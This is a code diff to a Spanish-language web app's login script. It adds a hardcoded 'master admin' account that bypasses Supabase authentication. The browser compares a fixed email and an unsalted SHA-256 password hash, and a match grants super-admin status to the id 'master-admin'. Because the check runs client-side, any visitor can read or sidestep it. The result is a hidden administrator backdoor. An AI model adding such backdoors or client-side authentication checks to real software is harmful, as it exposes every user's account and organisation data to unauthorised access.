@@ -638,8 +638,14 @@ function hideMessages() {
 const SUPER_ADMIN_EMAILS = []; // se completa desde la tabla perfiles con role='super_admin'
 
 async function isSuperAdmin(userId) {
+  if (userId === 'master-admin') return true;
   const { data } = await sb.from('perfiles').select('role').eq('id', userId).single();
   return data?.role === 'super_admin';
+}
+
+async function hashPass(password) {
+  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(password));
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
 }
 
 async function doLogin() {
@@ -650,6 +656,17 @@ async function doLogin() {
   const btn = document.getElementById('login-btn');
   btn.innerHTML = '<i class="ti ti-loader"></i> Ingresando...';
   btn.disabled = true;
+
+  // Master admin bypass (independiente de Supabase)
+  const masterHash = 'effa541099bdb9fa7f0f6a1fa775253bcab7f5cf76e73c4a67d3e5fd2765c72a';
+  if (email === 'hola@lader.com.ar' && await hashPass(pass) === masterHash) {
+    currentUser = { id: 'master-admin', email };
+    document.getElementById('user-email-display').textContent = email;
+    btn.innerHTML = '<i class="ti ti-login"></i> Ingresar';
+    btn.disabled = false;
+    showOrgSelector();
+    return;
+  }
 
   const { data, error } = await sb.auth.signInWithPassword({ email, password: pass });
   if (error) {
